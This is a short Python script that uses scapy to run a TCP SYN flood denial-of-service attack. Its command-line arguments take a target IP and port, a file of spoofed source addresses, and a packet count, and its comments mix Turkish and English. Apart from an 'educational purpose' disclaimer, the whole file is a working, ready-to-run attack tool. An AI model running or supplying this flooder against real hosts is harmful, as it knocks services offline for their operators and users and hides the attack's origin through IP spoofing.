########################################################################################
##                                                                                    ##
## @MAhmutAY   <mahmutayy@yahoo.com>                                                  ##
# # USAGE:                                                                            ##
## TCPSYNFLOODER.py <target_ip> <target_port> <spoofed_ips_file> <packet_count>       ##
## This is only educational purpose usage                                             ##
##  !!  Do not attempt to violate the laws with anything contained here. !!!          ##
########################################################################################

import argparse
import random
from scapy.all import IP, TCP, send, RandShort


def syn_flood(target_ip, target_port, spoofed_ips, packet_count):
    # Loop to send the specified number of packets
    for i in range(packet_count):
        # Choose a random IP address from the spoofed IPs list
        spoofed_ip = random.choice(spoofed_ips)
        
        # Create the IP layer 
        ip_layer = IP(src=spoofed_ip, dst=target_ip)
        
        # Create the TCP layer with the SYN flag set
        tcp_layer = TCP(sport=RandShort(), dport=target_port, flags="S")
        
        # Paketi yapilaniriyoruz create the package
        packet = ip_layer / tcp_layer
        
        # Send the package verbosity is your choose
        send(packet, verbose=False)
        
        #  durumu yazdir // Print the status
        print(f"Sent packet {i+1} from {spoofed_ip} to {target_ip}:{target_port}")

if __name__ == "__main__":
    #  Arguman parserları olusturuyoruz  // Create the argument parser
    parser = argparse.ArgumentParser(description="TCP SYN Flood Attack Script")
    
    # Add arguments
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("target_port", type=int, help="Target port number")
    parser.add_argument("spoofed_ips_file", help="File containing spoofed IP addresses")
    parser.add_argument("packet_count", type=int, help="how many packages will be send")
    
    # Parse the arguments
    args = parser.parse_args()
    
    # Read the spoofed IP addresses from the file
    with open(args.spoofed_ips_file, 'r') as file:
        spoofed_ips = [line.strip() for line in file]
    
    # Run The TCP SYN flood attack
    syn_flood(args.target_ip, args.target_port, spoofed_ips, args.packet_count)
